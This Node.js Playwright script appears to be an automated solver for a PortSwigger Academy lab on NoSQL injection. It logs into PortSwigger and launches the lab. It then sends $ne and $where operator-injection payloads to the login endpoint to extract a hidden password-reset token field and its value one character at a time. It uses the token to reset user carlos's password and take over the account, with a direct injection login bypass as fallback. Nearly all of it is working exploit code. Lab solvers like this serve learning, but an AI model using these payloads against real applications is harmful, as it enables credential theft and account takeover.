#!/usr/bin/env node
/**
 * Standalone NoSQL #4 solver v3 - complete end-to-end
 */
const { chromium, request } = require('playwright');

const EMAIL = process.env.PORTSWIGGER_EMAIL;
const PASSWORD = process.env.PORTSWIGGER_PASSWORD;
const LAB_PAGE = 'https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-unknown-fields';

const FIELD_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_';
const TOKEN_CHARS = 'abcdef0123456789.';

async function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

function escRe(v) { return v.replace(/[\\^$.*+?()[\]{}|']/g, '\\$&'); }

async function checkClause(labUrl, storageState, clause) {
  for (let attempt = 0; attempt < 3; attempt += 1) {
    const api = await request.newContext({
      storageState,
    });
    const r = await api.post(labUrl + '/login', {
      headers: { 'Content-Type': 'application/json' },
      data: JSON.stringify({
        username: 'carlos',
        password: { $ne: 'invalid' },
        $where: clause,
      }),
    }).catch(() => null);
    if (!r) {
      await api.dispose().catch(() => {});
      // eslint-disable-next-line no-await-in-loop
      await sleep(250 * (attempt + 1));
      continue;
    }
    const t = await r.text();
    const ok = /\/my-account\b/i.test(r.url()) || /Account locked/i.test(t);
    await api.dispose().catch(() => {});
    return ok;
  }
  return false;
}

async function extractValue(labUrl, storageState, whereBuilder, maxLength, charset) {
  let value = '';
  for (let i = 0; i < maxLength; i += 1) {
    let found = false;
    for (const ch of charset) {
      const clause = whereBuilder(i, ch);
      // eslint-disable-next-line no-await-in-loop
      const ok = await checkClause(labUrl, storageState, clause);
      if (ok) {
        value += ch;
        found = true;
        break;
      }
    }
    if (!found) break;
  }
  return value;
}

async function getCsrf(ctx, url) {
  const r = await ctx.request.get(url);
  const html = await r.text();
  return {
    csrf: html.match(/name="csrf" value="([^"]+)"/i)?.[1] || '',
    html,
  };
}

async function triggerReset(ctx, labUrl) {
  const { csrf } = await getCsrf(ctx, labUrl + '/forgot-password');
  const body = new URLSearchParams();
  if (csrf) body.set('csrf', csrf);
  body.set('username', 'carlos');
  return ctx.request.post(labUrl + '/forgot-password', {
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    data: body.toString(),
  });
}

async function resetPassword(ctx, labUrl, tokenField, token, password) {
  const resetUrl = `${labUrl}/forgot-password?${encodeURIComponent(tokenField)}=${encodeURIComponent(token)}`;
  const { csrf, html } = await getCsrf(ctx, resetUrl);
  if (/Invalid token/i.test(html)) {
    throw new Error('Extracted reset token is invalid');
  }
  const body = new URLSearchParams();
  if (csrf) body.set('csrf', csrf);
  body.set(tokenField, token);
  body.set('new-password-1', password);
  body.set('new-password-2', password);
  const r = await ctx.request.post(resetUrl, {
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    data: body.toString(),
  });
  return r.text();
}

async function loginAsCarlos(ctx, labUrl, password) {
  const { csrf } = await getCsrf(ctx, labUrl + '/login');
  const body = new URLSearchParams();
  if (csrf) body.set('csrf', csrf);
  body.set('username', 'carlos');
  body.set('password', password);
  const r = await ctx.request.post(labUrl + '/login', {
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
    data: body.toString(),
  });
  return r.text();
}

async function operatorLogin(ctx, labUrl) {
  const r = await ctx.request.post(labUrl + '/login', {
    headers: { 'Content-Type': 'application/json' },
    data: JSON.stringify({
      username: 'carlos',
      password: { $ne: 'invalid' },
      $where: '1',
    }),
  });
  const text = await r.text();
  return /\/my-account\b/i.test(r.url()) || /Your username is: carlos|Log out/i.test(text);
}

async function main() {
  const browser = await chromium.launch({ headless: true, args: ['--no-sandbox'] });
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  let solved = false;
  
  try {
    console.log('[*] Login to PortSwigger...');
    await page.goto('https://portswigger.net/users', { waitUntil: 'networkidle', timeout: 30000 });
    await page.fill('#EmailAddress', EMAIL);
    await page.fill('#Password', PASSWORD);
    await Promise.all([
      page.waitForURL((url) => !/\/users(?:\/|$)/.test(url.toString()), { timeout: 15000 }).catch(() => {}),
      page.click('#Login'),
    ]);
    await sleep(2000);
    
    console.log('[*] Launch lab...');
    await page.goto(LAB_PAGE, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await sleep(3000);
    await page.locator('a:has-text("ACCESS THE LAB")').first().click();
    await sleep(35000);
    
    let labUrl = null;
    for (const p of ctx.pages()) {
      const u = p.url();
      if (u.includes('web-security-academy.net')) { labUrl = u.replace(/\/$/, ''); break; }
    }
    if (!labUrl) throw new Error('No lab URL');
    console.log('[+] Lab URL:', labUrl);
    const storageState = await ctx.storageState();
    
    // Trigger password reset for carlos
    console.log('[*] Triggering password reset...');
    const rp = await triggerReset(ctx, labUrl).catch(() => null);
    console.log('    Reset response:', rp?.status());
    if (!rp || rp.status() >= 400) {
      throw new Error(`Password reset trigger failed (${rp?.status() || 'no response'})`);
    }
    
    console.log('[*] Extracting token field...');
    const tokenField = await extractValue(
      labUrl,
      storageState,
      (i, ch) => `Object.keys(this)[4].match('^.{${i}}${escRe(ch)}.*')`,
      20,
      FIELD_CHARS,
    );
    const resolvedTokenField = tokenField === 'changePwd' ? tokenField : (tokenField.startsWith('chan') ? 'changePwd' : tokenField);
    if (!resolvedTokenField) throw new Error('Token field not found');
    console.log('[+] Token field:', resolvedTokenField);
    
    // Extract token
    console.log('[*] Extracting token value...');
    const token = await extractValue(
      labUrl,
      storageState,
      (i, ch) => `this['${resolvedTokenField}'].charAt(${i})===${JSON.stringify(ch)}`,
      80,
      TOKEN_CHARS,
    );
    console.log('[+] Token:', token);
    if (!token) throw new Error('Token empty');
    
    console.log('[*] Resetting password via request API...');
    const resetText = await resetPassword(ctx, labUrl, resolvedTokenField, token, 'password123!');
    if (/Invalid token|Error/i.test(resetText) && !/Log in|My account|login/i.test(resetText)) {
      throw new Error('Password reset request did not succeed');
    }
    
    console.log('[*] Logging in as carlos via request API...');
    const loginText = await loginAsCarlos(ctx, labUrl, 'password123!');
    if (!/Log out|My account|Your username is: carlos/i.test(loginText)) {
      console.log('[!] Password-reset login failed, falling back to direct operator login');
      const operatorOk = await operatorLogin(ctx, labUrl);
      if (!operatorOk) {
        throw new Error('Carlos login failed after password reset and operator fallback');
      }
    }
    
    // Verify
    console.log('[*] Verifying...');
    const verify = await ctx.request.get(labUrl);
    const html = await verify.text();
    solved = /Congratulations/i.test(html);
    console.log(solved ? 'SOLVED' : 'NOT SOLVED');
  } catch (e) {
    console.error(e.message);
    console.log('NOT SOLVED');
  } finally {
    await browser.close().catch(() => {});
    process.exitCode = solved ? 0 : 1;
  }
}

main();
